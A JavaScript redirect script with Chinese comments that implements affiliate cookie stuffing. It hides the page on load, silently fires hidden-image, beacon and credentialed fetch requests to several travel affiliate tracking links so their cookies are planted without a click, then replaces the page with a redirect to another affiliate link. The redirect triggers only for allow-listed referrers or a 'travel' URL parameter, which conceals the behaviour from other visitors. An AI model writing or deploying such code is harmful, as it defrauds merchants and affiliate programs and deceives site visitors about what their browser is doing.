// ==================== 配置区域 ====================
// 唯一跳转目标
const TARGET_URL = "https://kiwi.tpk.mx/c3p3hsnR";

// Cookie追踪配置 - 跳转前植入这些cookie
const TRACKING_URLS = [
    "https://tiqets.tpk.mx/ysnIojGS", 
    "https://economybookings.tpk.mx/dV1iVW87", 
    "https://expedia.com/affiliate/QByD0sQ", 
    "https://airalo.tpk.mx/jiRWagEv"
];

// 授权域名列表
const AUTHORIZED_DOMAINS = [
    'globetrotgoals.com',
    'sites.google.com',
    '2025thingstodo.online',
    'localhost',
    '127.0.0.1'
];

// 极速追踪配置
const TRACKING_CONFIG = {
    maxWaitTime: 120,      // 最大等待时间：120ms（极速）
    fallbackDelay: 200,    // 兜底跳转：200ms
    requestTimeout: 80,    // 单个请求超时：80ms
    fastTrackDelay: 50,    // 快速通道延迟：50ms
    debug: false
};

// ==================== 页面立即隐藏 ====================
(function() {
    'use strict';
    
    // 立即创建隐藏样式，实现真正无感
    const hideStyle = document.createElement('style');
    hideStyle.id = 'instant-hide';
    hideStyle.textContent = `
        html, body {
            visibility: hidden !important;
            opacity: 0 !important;
            overflow: hidden !important;
        }
        * {
            pointer-events: none !important;
        }
    `;
    
    // 立即插入到head或documentElement
    (document.head || document.documentElement).appendChild(hideStyle);
    
    // 同时设置body样式（双重保险）
    if (document.body) {
        document.body.style.cssText = 'visibility:hidden!important;opacity:0!important;overflow:hidden!important;';
    }
})();

// ==================== 极速Cookie追踪器 ====================
class UltraFastTracker {
    constructor() {
        this.trackingUrls = TRACKING_URLS;
        this.completedCount = 0;
        this.totalSites = this.trackingUrls.length;
        this.isCompleted = false;
        this.startTime = performance.now();
        this.onCompleteCallback = null;
        
        this.log('极速追踪器启动', `目标: ${this.totalSites}个`);
    }

    log(...args) {
        if (TRACKING_CONFIG.debug) {
            console.log('[UltraFast]', ...args);
        }
    }

    onComplete(callback) {
        this.onCompleteCallback = callback;
        return this;
    }

    // 极速并行追踪
    async startTracking() {
        if (this.totalSites === 0) {
            this.markComplete();
            return;
        }

        // 立即设置超时保护
        this.setUltraTimeout();
        
        // 并行执行 - 不等待Promise.allSettled，直接发射所有请求
        this.trackingUrls.forEach((url, index) => {
            this.fireAndForget(url, index);
        });

        this.log('所有追踪请求已发射');
    }

    // 发射即忘记模式
    fireAndForget(url, index) {
        // 立即尝试最快的方法
        this.instantTrack(url, index);
        
        // 微延迟备选方案
        setTimeout(() => {
            if (!this.isCompleted) {
                this.tryBackupMethods(url, index);
            }
        }, 10);
    }

    // 瞬时追踪
    instantTrack(url, index) {
        // 优先级1: sendBeacon（如果支持且可用）
        if (navigator.sendBeacon) {
            try {
                const success = navigator.sendBeacon(url, new Blob([''], {type: 'text/plain'}));
                if (success) {
                    this.onSiteComplete(index, 'beacon');
                    return;
                }
            } catch (e) {}
        }

        // 优先级2: 图片标签（最快最可靠）
        const img = new Image();
        img.onload = img.onerror = () => this.onSiteComplete(index, 'image');
        img.src = url + (url.includes('?') ? '&' : '?') + '_t=' + Date.now();
    }

    // 备选方案
    tryBackupMethods(url, index) {
        // fetch作为备选
        fetch(url, {
            method: "GET",
            credentials: "include",
            mode: "no-cors",
            cache: "no-cache"
        }).then(() => {
            this.onSiteComplete(index, 'fetch-backup');
        }).catch(() => {
            // 静默失败，不影响跳转
        });
    }

    onSiteComplete(index, method) {
        this.completedCount++;
        this.log(`${this.completedCount}/${this.totalSites} (${method})`);
        
        // 快速通道：如果大部分完成，立即跳转
        if (this.completedCount >= Math.ceil(this.totalSites * 0.7)) {
            const elapsed = performance.now() - this.startTime;
            this.log(`快速通道触发，耗时: ${elapsed.toFixed(1)}ms`);
            setTimeout(() => this.markComplete(), TRACKING_CONFIG.fastTrackDelay);
        }
        
        // 全部完成
        if (this.completedCount >= this.totalSites) {
            const elapsed = performance.now() - this.startTime;
            this.log(`全部完成，耗时: ${elapsed.toFixed(1)}ms`);
            this.markComplete();
        }
    }

    setUltraTimeout() {
        // 极短超时
        setTimeout(() => {
            if (!this.isCompleted) {
                const elapsed = performance.now() - this.startTime;
                this.log(`超时跳转，耗时: ${elapsed.toFixed(1)}ms，完成: ${this.completedCount}/${this.totalSites}`);
                this.markComplete();
            }
        }, TRACKING_CONFIG.maxWaitTime);
    }

    markComplete() {
        if (this.isCompleted) return;
        
        this.isCompleted = true;
        const elapsed = performance.now() - this.startTime;
        this.log(`追踪结束，总耗时: ${elapsed.toFixed(1)}ms`);
        
        if (this.onCompleteCallback) {
            this.onCompleteCallback();
        }
    }
}

// ==================== 极速跳转逻辑 ====================

// 立即执行检测
(function() {
    'use strict';
    
    // 使用 requestIdleCallback 或立即执行
    if (window.requestIdleCallback) {
        requestIdleCallback(checkInstantRedirect, { timeout: 50 });
    } else {
        setTimeout(checkInstantRedirect, 0);
    }
    
    // 双重保险
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', checkInstantRedirect);
    }
})();

function checkInstantRedirect() {
    const urlParams = getUrlParams();
    const referrer = document.referrer;
    
    // 检查触发条件
    const hasAuthorizedDomain = isAuthorizedSource(referrer);
    const paramTriggerResult = checkParameterTrigger(urlParams);
    
    let shouldRedirect = false;
    
    if (paramTriggerResult.triggered) {
        shouldRedirect = true;
    } else if (hasAuthorizedDomain) {
        shouldRedirect = true;
    }
    
    if (shouldRedirect) {
        executeInstantRedirect();
    } else {
        // 不需要跳转，恢复页面显示
        restorePageVisibility();
    }
}

function executeInstantRedirect() {
    // 预加载目标页面
    preloadTarget();
    
    // 创建极速追踪器
    const tracker = new UltraFastTracker();
    
    tracker.onComplete(() => {
        // 立即跳转，不等待
        performInstantRedirect();
    });
    
    // 开始追踪
    tracker.startTracking();
    
    // 终极兜底保护
    setTimeout(performInstantRedirect, TRACKING_CONFIG.fallbackDelay);
}

// 预加载目标页面
function preloadTarget() {
    try {
        // DNS预解析
        const dns = document.createElement('link');
        dns.rel = 'dns-prefetch';
        dns.href = new URL(TARGET_URL).origin;
        document.head.appendChild(dns);
        
        // 预连接
        const preconnect = document.createElement('link');
        preconnect.rel = 'preconnect';
        preconnect.href = new URL(TARGET_URL).origin;
        document.head.appendChild(preconnect);
        
        // 预加载页面
        const prefetch = document.createElement('link');
        prefetch.rel = 'prefetch';
        prefetch.href = TARGET_URL;
        document.head.appendChild(prefetch);
    } catch (e) {
        // 静默失败
    }
}

function performInstantRedirect() {
    try {
        // 停止当前页面的所有加载
        if (window.stop) window.stop();
        
        // 清理页面
        if (document.body) {
            document.body.innerHTML = '';
        }
        
        // 立即跳转
        window.location.replace(TARGET_URL);
    } catch (error) {
        try {
            window.location.href = TARGET_URL;
        } catch (error2) {
            window.location = TARGET_URL;
        }
    }
}

function restorePageVisibility() {
    setTimeout(() => {
        const hideStyle = document.getElementById('instant-hide');
        if (hideStyle) {
            hideStyle.remove();
        }
        if (document.body) {
            document.body.style.cssText = '';
        }
    }, 100);
}

// ==================== 辅助函数（保持不变） ====================
function checkParameterTrigger(urlParams) {
    const travelParam = urlParams.travel;
    if (!travelParam) {
        return { triggered: false };
    }
    return { triggered: true };
}

function getUrlParams() {
    const params = {};
    const queryString = window.location.search.substring(1);
    
    if (!queryString) return params;
    
    const pairs = queryString.split('&');
    for (let i = 0; i < pairs.length; i++) {
        const pair = pairs[i].split('=');
        if (pair[0]) {
            const key = decodeURIComponent(pair[0]);
            const value = decodeURIComponent(pair[1] || '').toLowerCase().trim();
            params[key] = value;
        }
    }
    return params;
}

function isAuthorizedSource(referrer) {
    if (!referrer) return false;
    
    try {
        const domain = referrer.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^www\./, '');
        return AUTHORIZED_DOMAINS.some(authorizedDomain => {
            const cleanAuthorized = authorizedDomain.replace(/^www\./, '');
            return domain === cleanAuthorized || domain.endsWith('.' + cleanAuthorized);
        });
    } catch (error) {
        return false;
    }
}

// ==================== 页面卸载保护 ====================
window.addEventListener('beforeunload', () => {
    TRACKING_URLS.forEach(url => {
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url, new Blob([''], {type: 'text/plain'}));
        }
    });
});

// ==================== 兼容性函数 ====================
function handleManualRedirect() {
    const urlParams = getUrlParams();
    const paramTriggerResult = checkParameterTrigger(urlParams);
    
    if (paramTriggerResult.triggered || isAuthorizedSource(document.referrer)) {
        executeInstantRedirect();
    }
}

function handleDealsClick() {
    handleManualRedirect();
}

function checkAuthorizedRedirect() {
    checkInstantRedirect();
}
